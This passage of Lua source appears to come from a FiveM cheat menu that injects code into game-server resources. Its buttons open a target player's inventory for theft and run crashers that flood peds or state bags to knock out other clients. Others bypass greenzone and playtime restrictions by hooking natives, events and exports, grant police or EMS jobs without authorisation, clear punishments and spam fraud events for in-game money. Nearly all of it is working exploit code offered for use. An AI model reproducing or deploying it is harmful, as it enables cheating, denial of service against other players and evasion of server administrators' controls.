                                            TaskPlayAnim(targetPed, dict, anim, 8.0, 8.0, -1, 50, 0, false, false, false)
                                        end

                                        local inv = "%s"
                                        if inv == "ox" then
                                            TriggerEvent("ox_inventory:openInventory", "otherplayer", sid)
                                        elseif inv == "qb" then
                                            TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", sid)
                                        end
                                    end
                                end
                            end
                        end)
                    ]]):format(ActiveInventory)

                    MachoInjectResource2(NewThreadNs, ActiveInventory == "ox" and "ox_inventory" or "qb-inventory", code)

                        if canInjectResource() then
                            MachoInjectResource2(NewThreadNs, "any", code)
                        end
                        sendNotification("Inventory Stealer", "E to rob", "info", 2000)
                    end
                },
                {
                    label = "Crasher (K)",
                    type = "button",
                    onConfirm = function()
                    local code = [[
                        function MoonVisiblePedSpam()
                            CreateThread(function()
                                local player = PlayerPedId()
                                local origin = GetEntityCoords(player)
                                local model = GetHashKey("player_zero")
                                RequestModel(model)
                                while not HasModelLoaded(model) do Wait(0) end

                                local safeZ = origin.z + 1000.0 
                                SetEntityCoords(player, origin.x, origin.y, safeZ, false, false, false, false)
                                GiveWeaponToPed(player, GetHashKey("GADGET_PARACHUTE"), 1, false, true)
                                TaskParachute(player, true)

                                

                                local spawnedPeds = {}
                                local clusterRadius = 2.1

                                for i = 1, 75 do
                                    local angle = math.rad(i * 12)
                                    local offsetX = math.cos(angle) * clusterRadius
                                    local offsetY = math.sin(angle) * clusterRadius
                                    local ped = CreatePed(28, model, origin.x + offsetX, origin.y + offsetY, origin.z, 0.0, true, false)

                                    if DoesEntityExist(ped) then
                                        FreezeEntityPosition(ped, true)
                                        SetEntityInvincible(ped, true)
                                        TaskStandStill(ped, -1)
                                        SetBlockingOfNonTemporaryEvents(ped, true)
                                        table.insert(spawnedPeds, ped)
                                    end

                                    Wait(1)
                                end

                                Wait(6000)

                                for _, ped in ipairs(spawnedPeds) do
                                    if DoesEntityExist(ped) then
                                        DeleteEntity(ped)
                                    end
                                end

                                TaskParachute(player, false)
                                SetEntityCoords(player, origin.x, origin.y, origin.z + 1.0, false, false, false, false)
                            end)
                        end

                        CreateThread(function()
                            while true do
                                Wait(0)
                                if IsControlJustPressed(0, 311) then 
                                    MoonVisiblePedSpam()
                                end
                            end
                        end)
                    ]]


                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        end
                        sendNotification("Crasher", "Crashed them monkeyyyssss", "info", 2000)
                    end
                },
                {
                    label = "Crasher V2",
                    type = "button",
                    onConfirm = function()
                        if canInjectResource() then
                            local code = [[
                                for i=1, 1000 do RemoveStateBagChangeHandler(i) end
                                Citizen.Wait(100)
                                local idk = GetPlayerServerId(PlayerId())
                                local haha = {
                                    ['pos'] = 'vec3(0.000000, 0.000000, 0.000000)',
                                    ['rot'] = 'vec3(0.000000, 0.000000, 0.000000)',
                                    ['model'] = "p_spinning_anus_s",
                                    ['bone'] = 0
                                }
                                local haha2 = {}
                                for i=1, 1000 do
                                    haha2[i] = haha
                                end
                                local payload = msgpack.pack(haha2)
                                SetStateBagValue("player:" .. idk, "lib:progressProps", payload, #payload, true)
                            ]]
                            MachoInjectResourceRaw("ox_lib", code)
                        else
                            for i=1, 1000 do RemoveStateBagChangeHandler(i) end
                            Wait(100)
                            local idk = GetPlayerServerId(PlayerId())
                            local haha = {
                                ['pos'] = 'vec3(0.000000, 0.000000, 0.000000)',
                                ['rot'] = 'vec3(0.000000, 0.000000, 0.000000)',
                                ['model'] = "p_spinning_anus_s",
                                ['bone'] = 0
                            }
                            local haha2 = {}
                            for i=1, 1000 do
                                haha2[i] = haha
                            end
                            local payload = msgpack.pack(haha2)
                            SetStateBagValue("player:" .. idk, "lib:progressProps", payload, #payload, true)
                        end
                        sendNotification("Crasher V2", "Crashed", "success", 3000)
                    end
                },                                                        
                {
                    label = "Remove Playtime (Wait 1 minute)",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            function removePT()
                                CreateThread(function()
                                    for i = 1, 8000 do
                                        TriggerServerEvent('th_playtime:updateServerPlaytime')
                                        Wait(0)
                                    end
                                end)
                            end

                            removePT()
                        ]]

                        if FirstResouce() then
                            MachoInjectResourceRaw("any", code)
                        else
                        MachoInjectResource("forcng_playtime", [[
                            LocalPlayer.state.playtimeWeaponCheck = 100
                        ]])
                        end
                        sendNotification("Remove Playtime", "Can take up to 2 minutes to complete", "info", 2000)
                    end
                },
                {
                    type = 'button',
                    label = 'Bypass Greenzone (SOH)',
                    onConfirm = function()
                        local bypass_code = [[
                            local function hook_greenzone_natives()
                                if DisablePlayerFiring then
                                    DisablePlayerFiring = function(ped, toggle)
                                        return
                                    end
                                end

                                if SetEntityInvincible then
                                    local originalSetEntityInvincible = SetEntityInvincible
                                    SetEntityInvincible = function(entity, toggle)
                                        if entity == PlayerPedId() and toggle == true then
                                            return
                                        end
                                        return originalSetEntityInvincible(entity, toggle)
                                    end
                                end

                                if RemoveWeaponFromPed then
                                    RemoveWeaponFromPed = function(ped, weaponHash)
                                        return
                                    end
                                end

                                if SetPlayerCanDoDriveBy then
                                    SetPlayerCanDoDriveBy = function(player, toggle)
                                        return
                                    end
                                end

                                if SetVehicleMaxSpeed then
                                    SetVehicleMaxSpeed = function(vehicle, speed)
                                        return
                                    end
                                end

                                if SetEntityNoCollisionEntity then
                                    SetEntityNoCollisionEntity = function(entity1, entity2, toggle)
                                        return
                                    end
                                end
                            end

                            local function hook_greenzone_points()
                                if lib and lib.points then
                                    local originalNew = lib.points.new
                                    lib.points.new = function(coords, radius)
                                        local point = originalNew(coords, radius)

                                        point.onEnter = function(self)
                                            return
                                        end

                                        point.onExit = function(self)
                                            return
                                        end

                                        point.nearby = function(self)
                                            return
                                        end

                                        return point
                                    end
                                end
                            end

                            local function hook_greenzone_exports()
                                if exports then
                                    local originalExport = exports
                                    exports = setmetatable({}, {
                                        __index = function(t, resource)
                                            if resource == "lation_greenzones" then
                                                return {
                                                    IsInGreenZone = function()
                                                        return false
                                                    end
                                                }
                                            end
                                            return originalExport[resource]
                                        end
                                    })
                                end
                            end

                            local function hook_ui_functions()
                                if lib then
                                    if lib.showTextUI then
                                        lib.showTextUI = function(text, options)
                                            return
                                        end
                                    end

                                    if lib.hideTextUI then
                                        lib.hideTextUI = function()
                                            return
                                        end
                                    end

                                    if lib.notify then
                                        local originalNotify = lib.notify
                                        lib.notify = function(data)
                                            if data and data.description and
                                            (data.description:find("greenzone") or data.description:find("green zone")) then
                                                return
                                            end
                                            return originalNotify(data)
                                        end
                                    end
                                end
                            end

                            local function override_greenzone_variables()
                                if _G.inGreenZone ~= nil then
                                    _G.inGreenZone = false
                                end

                                if _G.greenZone then
                                    _G.greenZone = nil
                                end
                            end

                            hook_greenzone_natives()
                            hook_greenzone_points()
                            hook_greenzone_exports()
                            hook_ui_functions()
                            override_greenzone_variables()
                        ]]

                        if GetResourceState("lation_greenzones") == "started" then
                            MachoInjectResource2(1, "lation_greenzones", bypass_code)
                        end

                        sendNotification("Greenzone Bypass", "Greenzones Bypassed", "success", 3000)
                    end
                },                    
                {
                    label = "Remove Playtime (HOC)",
                    type = "button",
                    onConfirm = function()
                    local bypass_code = [[
                        local function hook_lib_system()
                            CreateThread(function()
                                while not lib do
                                    Wait(100)
                                end

                                if lib.callback and lib.callback.await then
                                    local originalCallback = lib.callback.await
                                    lib.callback.await = function(callbackName, ...)
                                        if callbackName == "hoc-playtime:checkCombatAccess" then
                                            return true
                                        end
                                        return originalCallback(callbackName, ...)
                                    end
                                end
                            end)
                        end

                        local function hook_combat_controls()
                            local originalDisablePlayerFiring = DisablePlayerFiring
                            DisablePlayerFiring = function(player, toggle)
                                return
                            end

                            local originalDisableControlAction = DisableControlAction
                            DisableControlAction = function(inputGroup, control, disable)
                                local combatControls = {
                                    24, 25, 68, 69, 70, 92, 114, 140, 141, 142, 263, 264
                                }

                                for _, combatControl in ipairs(combatControls) do
                                    if control == combatControl then
                                        return
                                    end
                                end

                                return originalDisableControlAction(inputGroup, control, disable)
                            end

                            local originalIsDisabledControlPressed = IsDisabledControlPressed
                            IsDisabledControlPressed = function(inputGroup, control)
                                local combatControls = {
                                    24, 25, 68, 69, 70, 92, 114, 140, 141, 142, 263, 264
                                }

                                for _, combatControl in ipairs(combatControls) do
                                    if control == combatControl then
                                        return IsControlPressed(inputGroup, control)
                                    end
                                end

                                return originalIsDisabledControlPressed(inputGroup, control)
                            end
                        end

                        local function hook_notification_system()
                            if lib and lib.notify then
                                local originalNotify = lib.notify
                                lib.notify = function(data)
                                    if data and data.description and
                                    (data.description:find("playtime") or
                                        data.description:find("combat") or
                                        data.description:find("access")) then
                                        return
                                    end
                                    return originalNotify(data)
                                end
                            end

                            local suspiciousNotificationNatives = {
                                "SetNotificationTextEntry", "AddNotification", "BeginTextCommandThefeedPost",
                                "EndTextCommandThefeedPostTicker", "ThefeedNextPostBackgroundColor"
                            }

                            for _, nativeName in ipairs(suspiciousNotificationNatives) do
                                if _G[nativeName] then
                                    local originalNative = _G[nativeName]
                                    _G[nativeName] = function(...)
                                        local args = {...}
                                        local textArg = args[1]

                                        if textArg and type(textArg) == "string" and
                                        (textArg:find("playtime") or textArg:find("combat") or textArg:find("access")) then
                                            return
                                        end

                                        return originalNative(...)
                                    end
                                end
                            end
                        end

                        local function hook_playtime_calculations()
                            if GetGameTimer then
                                local originalGetGameTimer = GetGameTimer
                                GetGameTimer = function()
                                    local realTime = originalGetGameTimer()
                                    local source = debug.getinfo(2, "S").source or ""

                                    if source:find("playtime") or source:find("hoc-playtime") then
                                        return realTime + (3600000 * 24)
                                    end

                                    return realTime
                                end
                            end

                            if GetCloudTimeAsInt then
                                local originalGetCloudTimeAsInt = GetCloudTimeAsInt
                                GetCloudTimeAsInt = function()
                                    local realTime = originalGetCloudTimeAsInt()
                                    local source = debug.getinfo(2, "S").source or ""

                                    if source:find("playtime") or source:find("hoc-playtime") then
                                        return realTime + (3600 * 24)
                                    end

                                    return realTime
                                end
                            end
                        end

                        local function hook_player_state()
                            CreateThread(function()
                                while not Player do
                                    Wait(100)
                                end

                                if Player.set then
                                    local originalPlayerSet = Player.set
                                    Player.set = function(key, value, ...)
                                        if key and (key:find("playtime") or
                                                key:find("combat_access") or
                                                key:find("new_player") or
                                                key:find("restricted")) then
                                            if key:find("combat_access") then
                                                return originalPlayerSet(key, true, ...)
                                            elseif key:find("playtime") then
                                                return originalPlayerSet(key, 86400, ...)
                                            elseif key:find("restricted") then
                                                return originalPlayerSet(key, false, ...)
                                            end
                                            return
                                        end
                                        return originalPlayerSet(key, value, ...)
                                    end
                                end

                                if Player.get then
                                    local originalPlayerGet = Player.get
                                    Player.get = function(key, defaultValue, ...)
                                        if key == "combat_access" or key == "hasCombatAccess" then
                                            return true
                                        elseif key and key:find("playtime") then
                                            return 86400
                                        elseif key and key:find("restricted") then
                                            return false
                                        end
                                        return originalPlayerGet(key, defaultValue, ...)
                                    end
                                end
                            end)
                        end

                        local function hook_thread_creation()
                            if CreateThread then
                                local originalCreateThread = CreateThread
                                CreateThread = function(threadFunction)
                                    local funcString = tostring(threadFunction)
                                    local source = debug.getinfo(threadFunction, "S").source or ""

                                    if source:find("playtime") or source:find("hoc-playtime") or
                                    funcString:find("checkCombatAccess") or
                                    funcString:find("DisablePlayerFiring") or
                                    funcString:find("playtime") then
                                        return originalCreateThread(function()
                                            while true do
                                                Wait(60000)
                                            end
                                        end)
                                    end

                                    return originalCreateThread(threadFunction)
                                end
                            end
                        end

                        local function hook_event_handlers()
                            if AddEventHandler then
                                local originalAddEventHandler = AddEventHandler
                                AddEventHandler = function(eventName, callback)
                                    if eventName and (eventName:find("playtime") or
                                                    eventName:find("combat") or
                                                    eventName:find("hoc-playtime")) then
                                        return originalAddEventHandler(eventName, function(...)
                                            return
                                        end)
                                    end
                                    return originalAddEventHandler(eventName, callback)
                                end
                            end

                            if RegisterNetEvent then
                                local originalRegisterNetEvent = RegisterNetEvent
                                RegisterNetEvent = function(eventName, callback)
                                    if eventName and (eventName:find("playtime") or
                                                    eventName:find("combat") or
                                                    eventName:find("hoc-playtime")) then
                                        if callback then
                                            return originalRegisterNetEvent(eventName, function(...)
                                                return
                                            end)
                                        else
                                            return originalRegisterNetEvent(eventName)
                                        end
                                    end
                                    return originalRegisterNetEvent(eventName, callback)
                                end
                            end
                        end

                        local function hook_rpc_system()
                            CreateThread(function()
                                while not RPC do
                                    Wait(100)
                                end

                                if RPC.await then
                                    local originalRPCAwait = RPC.await
                                    RPC.await = function(endpoint, ...)
                                        if endpoint and endpoint:find("playtime") then
                                            return true
                                        end
                                        return originalRPCAwait(endpoint, ...)
                                    end
                                end

                                if RPC.emitNet then
                                    local originalRPCEmitNet = RPC.emitNet
                                    RPC.emitNet = function(event, ...)
                                        if event and event:find("playtime") then
                                            return
                                        end
                                        return originalRPCEmitNet(event, ...)
                                    end
                                end
                            end)
                        end

                        local function hook_exports_system()
                            if exports then
                                local exportProxyMeta = {
                                    __index = function(self, key)
                                        if key and key:find("playtime") then
                                            return function(...)
                                                return true
                                            end
                                        end
                                        return rawget(self, key)
                                    end
                                }
                                setmetatable(exports, exportProxyMeta)
                            end
                        end

                        local function initialize_playtime_bypass()
                            hook_lib_system()
                            hook_combat_controls()
                            hook_notification_system()
                            hook_playtime_calculations()
                            hook_player_state()
                            hook_thread_creation()
                            hook_event_handlers()
                            hook_rpc_system()
                            hook_exports_system()
                        end

                        initialize_playtime_bypass()
                    ]]

                        if canInjectResource() then
                            MachoInjectResource2(1, "hoc-playtime", bypass_code)
                        end
                        sendNotification("Remove Playtime", "Done", "success", 2000)
                    end
                },                 
                {
                    type = 'button',
                    label = 'Set Police Job',
                    onConfirm = function()
                        local resourceUsed = false

                        if GetResourceState("wasabi_multijob") == "started" then
                            if canInjectResource() then
                                MachoInjectResource("wasabi_multijob", [[
                                    SelectJobMenu({
                                        job    = 'police',
                                        grade  = 2,
                                        label  = 'police',
                                        boss   = true,
                                        onDuty = false
                                    })
                                ]])
                            end
                            resourceUsed = true
                        elseif GetResourceState("core_multijob") == "started" then
                            if canInjectResource() then
                                MachoInjectResource("core_multijob", [[
                                    TriggerServerEvent("core_multijob:changeJob", "police", 2)
                                ]])
                            end
                            resourceUsed = true
                        elseif GetResourceState("es_extended") == "started" then
                            if canInjectResource() then
                                MachoInjectResource("es_extended", [[
                                    local job = {
                                        name = "police",
                                        label = "LSPD",
                                        grade = 2,
                                        grade_label = "Sergeant",
                                        grade_name = "sergeant",
                                        grade_salary = 0,
                                        skin_male = {},
                                        skin_female = {}
                                    }
                                    ESX.SetPlayerData("job", job)
                                ]])
                            end
                            resourceUsed = true
                        end

                        if resourceUsed then
                            sendNotification("Set Job", "Police job set", "success", 2000)
                        else
                            sendNotification("Set Job", "No resource found", "error", 2000)
                        end
                    end
                },
                {
                    type = 'button',
                    label = 'Set EMS Job',
                    onConfirm = function()
                        local resourceUsed = false

                        if GetResourceState("wasabi_multijob") == "started" then
                            if canInjectResource() then
                                MachoInjectResource("wasabi_multijob", [[
                                    SelectJobMenu({
                                        job    = 'ambulance',
                                        grade  = 2,
                                        label  = 'ambulance',
                                        boss   = true,
                                        onDuty = false
                                    })
                                ]])
                            end
                            resourceUsed = true
                        elseif GetResourceState("core_multijob") == "started" then
                            if canInjectResource() then
                                MachoInjectResource("core_multijob", [[
                                    TriggerServerEvent("core_multijob:changeJob", "ambulance", 2)
                                ]])
                            end
                            resourceUsed = true
                        elseif GetResourceState("es_extended") == "started" then
                            if canInjectResource() then
                                MachoInjectResource("es_extended", [[
                                    local job = {
                                        name = "ambulance",
                                        label = "EMS",
                                        grade = 1,
                                        grade_label = "Medic",
                                        grade_name = "medic",
                                        grade_salary = 0,
                                        skin_male = {},
                                        skin_female = {}
                                    }
                                    ESX.SetPlayerData("job", job)
                                ]])
                            end
                            resourceUsed = true
                        end

                        if resourceUsed then
                            sendNotification("Set Job", "EMS job set", "success", 2000)
                        else
                            sendNotification("Set Job", "No resource found", "error", 2000)
                        end
                    end
                },
                {
                    label = "Clear Coms",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            function sosms()
                                CreateThread(function()
                                    x_TriggerEvent = TriggerEvent
                                    x_TriggerEvent("updatePlayerPunishment", "clear")
                                end)
                            end

                            sosms()
                        ]]

                        if canInjectResource() then
                            MachoInjectResource2(3, "any", code)
                        else
                            function sosms()
                                CreateThread(function()
                                    x_TriggerEvent = TriggerEvent
                                    x_TriggerEvent("updatePlayerPunishment", "clear")
                                end)
                            end

                            sosms()
                        end
                        sendNotification("Clear Coms", "Coms cleared", "success", 2000)
                    end
                },
                {
                    label = "Clear Coms (100k Or Die)",
                    type = "button",
                    onConfirm = function()
                        local scriptsRunning = GetResourceState("scripts") == "started"
                        local frameworkRunning = GetResourceState("framework") == "started"

                        if scriptsRunning or frameworkRunning then
                            local runningResource = scriptsRunning and "scripts" or "framework"

                            if canInjectResource() then
                                MachoInjectResourceRaw(runningResource, [[
                                    local function decode(tbl)
                                        local s = ""
                                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                        return s
                                    end

                                    local function g(n) return _G[decode(n)] end

                                    CreateThread(function()
                                        for i = 1, 50 do
                                            lib.callback("comservs:completeAction", false, function(entity) end)
                                            g({87,97,105,116})(50)
                                        end
                                    end)
                                ]])
                                sendNotification("Comserv", "Ending community service", "success", 2000)
                            else
                            MachoInjectResource2(NewThreadNs, "scripts", [[
                                                local args = {
                                                    Sender = "Injected",
                                                    Reason = "Manual Set",
                                                    Actions = 0,
                                                    stateBagSync = LocalPlayer.state.stateBagSync + 1
                                                }

                                                LocalPlayer.state["Zen:Comserv:Client"] = args
                                            ]])
                                sendNotification("Comserv", "Ending community service", "success", 2000)
                            end
                        else
                            sendNotification("Comserv", "resource not found", "error", 2000)
                        end
                    end
                },
                {
                    label = "Set Chat Tag (100k or Die)",
                    type = "button",
                    onConfirm = function()
                        local scriptsRunning = GetResourceState("scripts") == "started"
                        local frameworkRunning = GetResourceState("framework") == "started"

                        if not (scriptsRunning or frameworkRunning) then
                            sendNotification("Chat Tag", "scripts/framework not found", "error", 2000)
                            return
                        end

                    openInputDialog("Enter Tag Name", 64, function(cTag)
                        if cTag and cTag ~= "" then
                            
                            openInputDialog("Enter RGB (example: 255, 0, 120)", 32, function(rgb)
                                if rgb and rgb ~= "" then
                                    
                                    SetcTag(cTag, rgb)

                                     sendNotification("Chat Tag", 
                                        cTag .. " (" .. rgb .. ") applied!", 
                                        "success", 3000
                                    )
                                end
                            end)

                        end
                    end)
                end
                },
                {
                    label = "Pedmenu Access (100k Or Die)",
                    type = "button",
                    onConfirm = function()
                    MachoInjectResource2(NewThreadNs, "scripts", [[
                    Zen.Functions.IsRolePresent = function() return "1434955581218619402" end
                    ]])
                    sendNotification("Ped Menu", "Access Granted", "success", 2000)
                    end
                },                
                {
                    label = "Set Police (100k Or Die)",
                    type = "button",
                    onConfirm = function()
                        local scriptsRunning = GetResourceState("scripts") == "started"
                        local frameworkRunning = GetResourceState("framework") == "started"

                        if scriptsRunning or frameworkRunning then
                            local code = [[
                                local lp = LocalPlayer
                                if lp and lp.state then
                                    lp.state:set("job", {
                                        name = "police",
                                        label = "Police",
                                        grade = 4,
                                        grade_name = "sergeant"
                                    }, true)
                                end
                            ]]

                            if canInjectResource() then
                                MachoInjectResourceRaw("scripts", code)
                            else
                                MachoInjectResource2(NewThreadNs, "scripts", code)
                            end
                            sendNotification("Set Job", "Job set to Police (Sergeant)", "success", 2000)
                        else
                            sendNotification("Set Job", "not found", "error", 2000)
                        end
                    end
                },                                                
                {
                    label = "Dirty Money (1-2M)",
                    type = "button",
                    onConfirm = function()
                        if GetResourceState("spoodyFraud") ~= "started" then
                            sendNotification("Dirty Money", "spoodyFraud not found", "error", 2000)
                            return
                        end

                        local code = [[
                            function Spoody()
                                for i = 1, 50 do
                                    TriggerServerEvent('spoodyFraud:interactionComplete', 'Swapped Sim Card')
                                    TriggerServerEvent('spoodyFraud:interactionComplete', 'Cloned Card')

                                    Citizen.Wait(5)

                                    TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Pacific Bank', 'clone')
                                    TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Sandy Shoes', 'sim')
                                end
                            end

                            CreateThread(function()
                                Spoody()
                            end)
                        ]]

                        if canInjectResource() then
                            MachoInjectResource('spoodyFraud', code)
                        else
                           MachoInjectResource2(NewThreadNs, 'spoodyFraud', code)
                        end
                        sendNotification("Dirty Money", "Dirty money received", "success", 2000)
                    end
                },                              
            }
        }
    }
})

table.insert(activeMenu, {
    label = 'Emotes',
    type = 'submenu',
    tabs = {
        {
            name = 'Main Menu',
            submenu = {
                {
                    label = "Meditate On Player",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            function Meditate()
                                CreateThread(function()
                                    local players = GetActivePlayers()
                                    local myPed = PlayerPedId()
                                    local myCoords = GetEntityCoords(myPed)
                                    local closest = nil
                                    local closestDist = 9999.0

                                    for _, pid in ipairs(players) do
                                        local ped = GetPlayerPed(pid)
                                        local dist = #(GetEntityCoords(ped) - myCoords)
                                        if dist < closestDist and pid ~= PlayerId() then
                                            closest = pid
                                            closestDist = dist
                                        end
                                    end

                                    if closest then
                                        local targetPed = GetPlayerPed(closest)
                                        ClearPedTasksImmediately(targetPed)
                                        TaskStartScenarioInPlace(targetPed, "WORLD_HUMAN_MEDITATING", 0, true)
                                        AttachEntityToEntity(myPed, targetPed, 0, 0.0, 0.0, 1.25, 0.0, 0.0, 0.0, false, false,
                false, false, 2, true)
                                    end
                                end)
                            end
                            Meditate()
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        else
                            function Meditate()
                                CreateThread(function()
                                    local players = GetActivePlayers()
                                    local myPed = PlayerPedId()
                                    local myCoords = GetEntityCoords(myPed)
                                    local closest = nil
                                    local closestDist = 9999.0

                                    for _, pid in ipairs(players) do
                                        local ped = GetPlayerPed(pid)
                                        local dist = #(GetEntityCoords(ped) - myCoords)
                                        if dist < closestDist and pid ~= PlayerId() then
                                            closest = pid
                                            closestDist = dist
                                        end
                                    end

                                    if closest then
                                        local targetPed = GetPlayerPed(closest)
                                        ClearPedTasksImmediately(targetPed)
                                        TaskStartScenarioInPlace(targetPed, "WORLD_HUMAN_MEDITATING", 0, true)
                                        AttachEntityToEntity(myPed, targetPed, 0, 0.0, 0.0, 1.25, 0.0, 0.0, 0.0, false, false,
                false, false, 2, true)
                                    end
                                end)
                            end
                            Meditate()
                        end
                        sendNotification("Meditate", "Meditating on player", "success", 2000)
                    end
                },

                {
                    label = "Twerk on Em",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local ped = PlayerPedId()
                            local players = GetActivePlayers()
                            local closestPlayer = nil
                            local closestDist = 5.0

                            for _, playerId in ipairs(players) do
                                local targetPed = GetPlayerPed(playerId)
                                if targetPed ~= ped then
                                    local dist = #(GetEntityCoords(ped) - GetEntityCoords(targetPed))
                                    if dist < closestDist then
                                        closestPlayer = targetPed
                                        closestDist = dist
                                    end
                                end
                            end

                            if closestPlayer then
                                AttachEntityToEntity(ped, closestPlayer, 0, 0.0, 0.5, -0.1, 0.0, 0.0, 0.0, false, false, false,
                false, 2, true)
                                ExecuteCommand("e twerk")
                            end
                        ]]

                        if canInjectResource() then
                            MachoInjectResourceRaw("any", code)
                        else
                            local ped = PlayerPedId()
                            local players = GetActivePlayers()
                            local closestPlayer = nil
                            local closestDist = 5.0

                            for _, playerId in ipairs(players) do
                                local targetPed = GetPlayerPed(playerId)
                                if targetPed ~= ped then
                                    local dist = #(GetEntityCoords(ped) - GetEntityCoords(targetPed))
                                    if dist < closestDist then
                                        closestPlayer = targetPed
                                        closestDist = dist
                                    end
                                end
                            end

                            if closestPlayer then
                                AttachEntityToEntity(ped, closestPlayer, 0, 0.0, 0.5, -0.1, 0.0, 0.0, 0.0, false, false, false,
                false, 2, true)
                                ExecuteCommand("e twerk")
                            end
                        end
                        sendNotification("Twerk", "Twerking on player", "success", 2000)
                    end
                },

                {
                    label = "Piggyback On Player",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local function RtKpqLmXZV()
                                local closestPlayer, closestDistance = nil, math.huge
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)

                                for _, playerId in ipairs(GetActivePlayers()) do
                                    local targetPed = GetPlayerPed(playerId)
                                    if targetPed ~= playerPed then
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local distance = #(playerCoords - targetCoords)

                                        if distance < closestDistance then
                                            closestDistance = distance
                                            closestPlayer = playerId
                                        end
                                    end
                                end

                                if closestPlayer then
                                    if _G.isInPiggyBack then
                                        ClearPedSecondaryTask(playerPed)
                                        DetachEntity(playerPed, true, false)
                                        _G.isInPiggyBack = false
                                    else
                                        _G.isInPiggyBack = true
                                        if not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") then
                                            RequestAnimDict("anim@arena@celeb@flat@paired@no_props@")
                                            while not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") do
                                                Wait(0)
                                            end
                                        end

                                        local targetPed = GetPlayerPed(closestPlayer)
                                        AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.0, -0.25, 0.45, 0.5, 0.5, 180, false,
                false, false, false, 2, false)
                                        TaskPlayAnim(PlayerPedId(), "anim@arena@celeb@flat@paired@no_props@",
                "piggyback_c_player_b", 8.0, -8.0, 1000000, 33, 0, false, false, false)
                                    end
                                end
                            end
                            RtKpqLmXZV()
                        ]]

                        if canInjectResource() then
                            MachoInjectResource2(3, "any", code)
                        else
                            local function RtKpqLmXZV()
                                local closestPlayer, closestDistance = nil, math.huge
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)

                                for _, playerId in ipairs(GetActivePlayers()) do
                                    local targetPed = GetPlayerPed(playerId)
                                    if targetPed ~= playerPed then
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local distance = #(playerCoords - targetCoords)

                                        if distance < closestDistance then
                                            closestDistance = distance
                                            closestPlayer = playerId
                                        end
                                    end
                                end

                                if closestPlayer then
                                    if _G.isInPiggyBack then
                                        ClearPedSecondaryTask(playerPed)
                                        DetachEntity(playerPed, true, false)
                                        _G.isInPiggyBack = false
                                    else
                                        _G.isInPiggyBack = true
                                        if not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") then
                                            RequestAnimDict("anim@arena@celeb@flat@paired@no_props@")
                                            while not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") do
                                                Wait(0)
                                            end
                                        end

                                        local targetPed = GetPlayerPed(closestPlayer)
                                        AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.0, -0.25, 0.45, 0.5, 0.5, 180, false,
                false, false, false, 2, false)
                                        TaskPlayAnim(PlayerPedId(), "anim@arena@celeb@flat@paired@no_props@",
                "piggyback_c_player_b", 8.0, -8.0, 1000000, 33, 0, false, false, false)
                                    end
                                end
                            end
                            RtKpqLmXZV()
                        end
                        sendNotification("Piggyback", "Piggybacking player", "success", 2000)
                    end
                },

                {
                    label = "Blame Arrest",
                    type = "button",
                    onConfirm = function()
                        local code = [[
                            local function WXY7LpqKto()
                                local closestPlayer, closestDistance = nil, math.huge
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)

                                for _, playerId in ipairs(GetActivePlayers()) do
                                    local targetPed = GetPlayerPed(playerId)
                                    if targetPed ~= playerPed then
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local distance = #(playerCoords - targetCoords)

                                        if distance < closestDistance then
                                            closestDistance = distance
                                            closestPlayer = playerId
                                        end
                                    end
                                end

                                if closestPlayer then
                                    if _G.StarkCuff then
                                        ClearPedSecondaryTask(playerPed)
                                        DetachEntity(playerPed, true, false)
                                        _G.StarkCuff = false
                                    else
                                        _G.StarkCuff = true
                                        if not HasAnimDictLoaded("mp_arresting") then
                                            RequestAnimDict("mp_arresting")
                                            while not HasAnimDictLoaded("mp_arresting") do
                                                Wait(0)
                                            end
                                        end

                                        local targetPed = GetPlayerPed(closestPlayer)
                                        AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.35, 0.38, 0.0, 0.0, 0.0, 0.0,
                false, false, false, false, 2, true)
                                        TaskPlayAnim(PlayerPedId(), "mp_arresting", "idle", 8.0, -8, -1, 49, 0.0, false, false,
                false)
                                    end
                                end
                            end
                            WXY7LpqKto()
                        ]]

                        if canInjectResource() then
                            MachoInjectResource2(3, "any", code)
                        else
                            local function WXY7LpqKto()
                                local closestPlayer, closestDistance = nil, math.huge
                                local playerPed = PlayerPedId()
                                local playerCoords = GetEntityCoords(playerPed)

                                for _, playerId in ipairs(GetActivePlayers()) do
                                    local targetPed = GetPlayerPed(playerId)
                                    if targetPed ~= playerPed then
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local distance = #(playerCoords - targetCoords)

                                        if distance < closestDistance then
                                            closestDistance = distance
                                            closestPlayer = playerId
                                        end
                                    end
                                end

                                if closestPlayer then
                                    if _G.StarkCuff then
                                        ClearPedSecondaryTask(playerPed)
                                        DetachEntity(playerPed, true, false)
                                        _G.StarkCuff = false
                                    else
                                        _G.StarkCuff = true
                                        if not HasAnimDictLoaded("mp_arresting") then
                                            RequestAnimDict("mp_arresting")
                                            while not HasAnimDictLoaded("mp_arresting") do
                                                Wait(0)
                                            end
                                        end

                                        local targetPed = GetPlayerPed(closestPlayer)
                                        AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.35, 0.38, 0.0, 0.0, 0.0, 0.0,
                false, false, false, false, 2, true)
                                        TaskPlayAnim(PlayerPedId(), "mp_arresting", "idle", 8.0, -8, -1, 49, 0.0, false, false,
                false)
                                    end
                                end
                            end
                            WXY7LpqKto()
                        end
